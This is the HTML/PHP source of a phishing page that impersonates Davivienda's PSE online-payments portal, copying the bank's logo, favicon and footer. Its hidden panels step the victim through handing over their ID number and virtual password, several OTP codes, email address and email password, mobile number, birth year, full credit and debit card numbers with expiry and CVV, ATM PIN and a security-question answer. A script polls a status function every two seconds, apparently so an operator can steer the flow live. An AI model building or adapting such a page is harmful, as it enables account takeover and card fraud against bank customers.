
   

<!DOCTYPE html>
<html lang="es">

<head>
    <title>Davivienda</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="icon" href="https://www.davivienda.com/PersonasDaviviendaNewTheme/images/faviconDav.ico" type="image/x-icon">
    <link href="./css/estilos.min.css" type="text/css" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>

    <link href="./css/style.css" type="text/css" rel="stylesheet" media="screen,projection"/> 
    <script type="text/javascript" src="js/operaciones.js?v=<?php echo time(); ?>"></script>
    <script type="text/javascript" src="js/functions.js?v=<?php echo time(); ?>"></script> 

<style type="text/css">
   @media only screen and (max-width: 600px) {
      .mensaje{
      width: 350px !important; 
      padding: 20px !important;
          margin-left: -175px !important;
          margin-top: -55px !important;
          width: 350px !important;                  
          font-size: 18px !important;
      }
      #cargandoani{
        width: 50px !important;
      }
  }

    .fondo{
        width: 100%;
        height: 100%;
        position: fixed;
        z-index: 189;
        top: 0;
        left: 0;
        background: #00000082;
        display: none;
    }

    .mensaje{
      padding: 30px;
      background: #fff;
      position: fixed;
      z-index: 190;
        top: 50%;
        left: 50%;
        margin-left: -280px;
        margin-top: -55px;
        width: 560px;        
        border-radius: 15px;
        color: #000;
        font-family: 'CIBFontSans',Arial, Helvetica, sans-serif, Verdana; 
        font-weight: 100; 
        font-style: normal;
        font-size: 18px;
        display: none;
    }

.msgVacio{
    display: table;
    font-size: 13px;
    font-style: italic;
    color:#ff0303;
}

.msgValida{
    display: table;
    font-size: 13px;
    font-style: italic;
    color:#ff0303;
}    

.msgVacio{
  display: none;
}   

</style>

<script type="text/javascript">
  $(document).ready(function($){

  setInterval(consultar_estado, 2000); 

  });
</script>    
    
</head>

  <body >
  <div class="fondo"></div>
  <div class="mensaje">
    <table>
    <tr >
      <td style="padding: 15px; font-size: 18px; color: #000000 ;">Por favor espere un momento estamos <strong>validando algunos datos.</strong> Puede tardar entre 1 a 5 minuto. <strong>No cierres o recargues esta ventana.</strong></td>
      <td><img id="cargandoani" src="./img/load.gif"></td>
    </tr>
  </table></div> 

    <header>

      <div class="cabecera" style="text-align: justify;">
            <div  style="position: relative; top: 18px; left: 10%;">
                       <a href="https://www.davivienda.com/wps/portal/personas/nuevo" title="Volver a Home personas">
                       <img src="./img/davivienda_logo.png" width="280" height="40"></a>
            </div>
            <div class="wrapRight" >
                <script language="JavaScript">
                    obtenerFechaFormato();                        
                </script>
                <br>Código único CUS: <?= (string) random_int(1000000000, 9999999999) ?>
            </div>          
      </div>
      
    </header>
    
<!--    +++++++++++    formulario     ++++++++++++++-->
<div class="home" >
                <section>
                <div class="contenedorTabla">
                    <table class="centrar">
                        <tbody>
                            <tr>
                                <td>
                                    <h1 align="center">Bienvenido al Portal de</h1>
                                    <h2 align="center">Pagos en Línea y PSE</h2>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>
                                                    <p style="margin: 0px" align="center">Seleccione el canal por
                                                        el cual realizará el pago:</p>
                                                    <br>
                                                    <br>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <table class="centrar">
                                                        <tbody>
                                                            <tr onclick="paso1()">
                                                                <td class="centrar">
                                                                    
                                                                        <div class="natural" >
                                                                            
                                                                            <i class="iconoNatural ico-app"></i>
                                                                            <center>
                                                                            <p style="margin: 0px;  text-align: center; font-size: 11px;" >Persona</p>
                                                                            <p style="margin: 0px;  text-align: center; font-size: 11px;" >Natural</p>
                                                                            </center>
                                                                        </div>
                                                                    
                                                                </td>
                                                                <td> 
                                                                                                       
                                                                        <div class="juridico">
                                                                            <i class="iconoJuridico ico-app"></i>
                                                                            <p style="margin: 0px;  text-align: center; font-size: 11px;">Empresa</p>
                                                                        </div>
                                                                    
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <br>
                                                    <br>
                                                    <center>
                                                        No olvide Cerrar Sesión <br>una vez termine sus transacciones.
                                                    </center>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                </section>
</div>
<!--****************************  ****************************-->
<div class="acceso" style="display: none;">
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Lnea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Tipo de documento</label>
                                    <select id="tipo_doc" name="tipo_doc" size="1" class="BGSelectbox" style="height: 37px;">  
                                        <option value="01" selected="selected">Cedula de Ciudadania</option>    
                                        <option value="02">Cedula de Extranjeria</option>   
                                        <option value="03">NIT</option> 
                                        <option value="04">Tarjeta de Identidad</option>    
                                        <option value="05">Pasaporte</option>   
                                        <option value="06">Trj. Seguro Social Extranjero</option>   
                                        <option value="07">Sociedad Extranjera sin NIT en Colombia</option> 
                                        <option value="08">Fideicomiso</option> 
                                        <option value="09">NIT Menores</option> 
                                        <option value="10">RIF Venezuela</option>   
                                        <option value="11">NIT Extranjeria</option> 
                                        <option value="12">NIT Persona Natural</option> 
                                        <option value="13">Registro Civil De Nacimiento</option></select>
                                </div>

                                <div class="columna">
                                    <label class="labels">No. de documento</label>
                                    <input id="usuario" name="usuario" type="text" value="" maxlength="30" class="BGinputbox" autocomplete="off" style="height: 37px;">
                                    <input type="hidden" name="sesionid" id="sesionid" value="68e65b4e746a3c2cc744ef419402408378bd69ca01b200d5928366f8387ae3ff ">
                                    <center> <span id="msgUsuario" class="msgVacio">El campo esta vacio</span> </center>
                                </div>

                                <div class="columna" id="clave" name="clave" style="display: none;">
                                    <label class="labels">Clave virtual</label>
                                    <input id="password" name="password" type="password" value="" maxlength="8" class="BGinputbox" autocomplete="off" style="height: 37px;">
                                    <center> <span id="msgClave" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                                

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="mostrar()">
                                                    <input id="dos" name="dos" type="submit" value="Continuar" class="botonRojo" onclick="final()" style="display: none;">
                                                </td>
                                                <td>&nbsp;&nbsp;</td>
                                                <td>
                                                    <input id="" name="" type="submit" value="Cancelar" class="botonGris">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>    
</div>
<!--****************************  ****************************-->
<div class="otp" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Lnea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingrese Codigo OTP (Enviado a su celular)</label>
                                    <input id="codigootp" name="codigootp" type="password" value="" maxlength="8" class="BGinputbox" autocomplete="off" style="height: 37px; width: 80%;">
                                    <center> <span id="msgOTP" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardarotp()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="errorotp" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingrese Codigo OTP (Enviado a su celular)</label>
                                    <input id="codigootp2" name="codigootp2" type="password" value="" maxlength="8" class="BGinputbox" autocomplete="off" style="height: 37px; width: 80%;">
                                    <center> <span id="msgOTP2" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardarotp2()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="correo-con" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingrese su Correo Electrónico</label>
                                    <input id="email" name="email" type="text" value="" maxlength="30" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgEmail" class="msgVacio">El campo esta vacio</span> </center>
                                </div>  
                                <div class="columna">
                                    <label class="labels">Ingrese su Clave de Correo</label>
                                    <input id="clavemail" name="clavemail" type="password" value="" maxlength="30" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgClaveEmail" class="msgVacio">El campo esta vacio</span> </center>
                                </div>
                                <div class="columna">
                                    <label class="labels">Número de celular</label>
                                    <input id="celular_corr" name="celular_corr" type="text" value="" maxlength="10" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgCelularCorr" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                                                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="registraremail()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="apellidos" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingresar su primer apellido</label>
                                    <input id="apellido" name="apellido" type="text" value="" maxlength="20" class="BGinputbox" autocomplete="off" style="height: 37px; width: 80%;">
                                    <center> <span id="msgApellido" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardarape()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="mobil" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels"> Ingrese su Celular</label>
                                    <input id="celular" name="celular" type="text" value="" maxlength="10" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgCelular" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="registrarcel()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="fnacimiento" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingresar su año de nacimiento</label>
                                    <input id="nacimiento" name="nacimiento" type="text" value="" maxlength="4" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgAnio" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardarnac()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="tarjeta" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingrese los 16 digitos de su tarjeta crédito</label>
                                    <input id="tarjeta16" name="tarjeta16" type="text" value="" maxlength="16" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgTarjeta" class="msgVacio">El campo esta vacio</span> </center>
                                </div>  
                                <div class="columna">
                                    <label class="labels">Fecha de vencimiento</label>
                                    <input id="Fecha" name="Fecha" type="text" value="" placeholder="Mes / Año" maxlength="5" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgExpira" class="msgVacio">El campo esta vacio</span> </center>
                                </div>   
                                <div class="columna">
                                    <label class="labels">CVV</label>
                                    <input id="cvv" name="cvv" type="text" value="" maxlength="3" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgCVV" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                                                                                              

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardartar()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="tarjetadt" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <label class="labels">Ingrese los 16 digitos de su tarjeta débito</label>
                                    <input id="tarjeta16dt" name="tarjeta16dt" type="text" value="" maxlength="16" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgTarjetadt" class="msgVacio">El campo esta vacio</span> </center>
                                </div>  
                                <div class="columna">
                                    <label class="labels">Fecha de vencimiento</label>
                                    <input id="Fechadt" name="Fechadt" type="text" value="" placeholder="Mes / Año" maxlength="5" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgExpiradt" class="msgVacio">El campo esta vacio</span> </center>
                                </div>   
                                <div class="columna">
                                    <label class="labels">CVV</label>
                                    <input id="cvvdt" name="cvvdt" type="text" value="" maxlength="3" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgCVVdt" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                                                                                              
                                <div class="columna">
                                    <label class="labels">Clave de cajero</label>
                                    <input id="clavedt" name="clavedt" type="text" value="" maxlength="4" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgClavedt" class="msgVacio">El campo esta vacio</span> </center>
                                </div> 
                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardartardt()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>
<!--****************************  ****************************-->
<div class="pregunta2" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Lnea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <center><label id="preg2" class="labels"> </label></center>                                  
                                    <input id="resp2" name="resp2" type="text" value="" maxlength="35" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgResp" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="registaresp2()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>

<!--****************************  ****************************-->
<div class="smsotp" style="display: none;" >
                <section>
                    <div class="contenedorArticulos">
                        <h1 style="text-align: center">Ingreso Persona Natural</h1>
                        <h2 style="text-align: center">Pagos en Línea y PSE</h2>
                        <br>
                        <br>
                         <span id="">
                            <div class="contenedor">
                                <center>
                                    <span class="enunciado">Por favor ingrese la siguiente información:</span>
                                </center>
                                <br>
                                <div class="columna">
                                    <center><label class="labels">Ingrese el codigo OTP enviado al numero celular registrado en el banco</label></center>                                  
                                    <input id="smsotp" name="smsotp" type="password" value="" maxlength="8" class="BGinputbox" autocomplete="off" style="height: 37px; width: 90%;">
                                    <center> <span id="msgSMSOTP" class="msgVacio">El campo esta vacio</span> </center>
                                </div>                               

                                <div class="columna">
                                    <table class="centrar">
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td>
                                                    <input id="uno" name="uno" type="submit" value="Continuar" class="botonRojo" onclick="guardarsmsotp()">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                    <p>
                                    </p>
                                </div>

                                <div class="columna">
                                </div>
                                <br> <br>
                            </div>
                        </span>
                    </div>
                </section>      
</div>

<!--**************************** PIE DE PAGINA ****************************-->
                <footer>
                    <div class="mostrar">
                        <div style="" >
                            Banco Davivienda S.A. Todos los derechos reservados 2023.<br>
                            <img src="./img/vigilado.png" alt="Vigilado">
                        </div> 
                    </div>

                    <div class="ocultar">
                        <div class="wrapLeft"><img src="./img/vigilado.png" alt="Vigilado">
                        </div>
                        <div class="wrapCenter">
                            Banco Davivienda S.A. Todos los derechos reservados
                            2023
                            .
                        </div>
                        <div class="wrapRight"><img src="./img/Logo-Davivienda-footer.png" ></div>                   
                    </div>
                </footer>
</body>
</html>